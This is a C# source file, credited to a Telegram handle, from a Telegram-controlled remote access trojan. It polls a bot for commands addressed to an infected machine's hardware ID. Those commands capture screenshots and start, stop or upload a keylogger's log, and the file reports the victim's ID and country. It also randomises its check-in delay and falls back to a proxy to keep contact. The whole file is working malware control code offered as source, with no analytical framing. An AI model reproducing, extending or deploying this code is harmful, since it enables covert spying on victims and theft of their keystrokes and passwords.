/////////////////////////////////////////////////////////
///////////////////By Telegram: @madcod//////////////////
/////////////////////////////////////////////////////////

using SimpleJSON;
using System;
using System.IO;
using System.Net;
using System.Threading;

namespace TGControlBot
{
    class Tasks
    {
        static int offset = 0; //учет просмотра обновлений.

        public static string Start()
        {
            while (true)
            {
                try
                {
                    string messages = GET(Help.ApiUrl + Program.token + "/getUpdates?offset=" + (offset + 1));
                    var Json = JSON.Parse(messages);
                    foreach (JSONNode n in Json["result"].AsArray)
                    {
                        offset = n["update_id"].AsInt;

                        string msg = n["message"]["text"];
                        if (msg.IndexOf(Help.HWID) > -1 || msg.IndexOf("All") > -1)
                        {
                            string[] comand = msg.Split(':');

                            switch (comand[0])
                            {

                                case "screen":
                                    new Thread(() =>
                                    {
                                        Functions.ScreenSend();
                                    }).Start();
                                    break;

                                case "loggerstart":
                                    new Thread(() =>
                                    {
                                        KeyLogger.Start();
                                    }).Start();
                                    break;

                                case "loggerdel":
                                    new Thread(() =>
                                    {
                                        KeyLogger.Stop();
                                    }).Start();
                                    break;


                                case "loggersend":
                                    new Thread(() =>
                                    {
                                        KeyLogger.SendLog();
                                    }).Start();
                                    break;
                            }
                        }
                        if (msg == "online")
                        {
                            GET(Help.ApiUrl + Program.token + "/sendMessage?" + "chat_id=" + n["message"]["chat"]["id"] + "&text=" + "🆔 HWID: " + Help.HWID + Help.Country());
                        }

                    }
                    // Делаем рандомную задержку отстука в ТГ, вить это ТГ, малоли.
                    Thread.Sleep(new Random(Environment.TickCount).Next(10000, 60000));
                }
                catch { }
            }
        }
        public static string GET(string URL)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
            try
            {
                WebRequest req = WebRequest.Create(URL);
                WebResponse resp = req.GetResponse();
                Stream stream = resp.GetResponseStream();
                StreamReader sr = new StreamReader(stream);
                string OUT = sr.ReadToEnd();
                return OUT;
            }
            catch
            {
                // Пробуем через Proxy достучаться до API Telegram
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
                WebRequest req = WebRequest.Create(URL);
                var myproxy = new WebProxy(Program.ip_proxy, Program.port_proxy) // IP Proxy
                {
                    Credentials = new NetworkCredential(Program.login_proxy, Program.password_proxy) // Логин и пароль Proxy
                };
                req.Proxy = myproxy; req.Method = "GET";
                HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
                Stream stream = resp.GetResponseStream();
                StreamReader sr = new StreamReader(stream);
                string OUT = sr.ReadToEnd();
                return OUT;
            }


        }
    }
}
